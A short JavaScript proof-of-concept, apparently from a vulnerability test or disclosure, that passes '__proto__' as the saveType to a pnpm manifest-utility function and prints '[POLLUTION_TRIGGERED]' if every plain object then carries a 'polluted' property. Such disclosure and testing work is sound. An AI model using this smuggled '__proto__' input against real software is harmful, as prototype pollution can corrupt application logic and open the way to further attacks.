require("@pnpm/manifest-utils").updateProjectManifestObject('prefix', {}, [{
    saveType: '__proto__',
    alias: 'polluted',
    pref: 'value',
    bareSpecifier: true
}]);
console.log(({} as any).polluted !== undefined ? '[POLLUTION_TRIGGERED]' : '');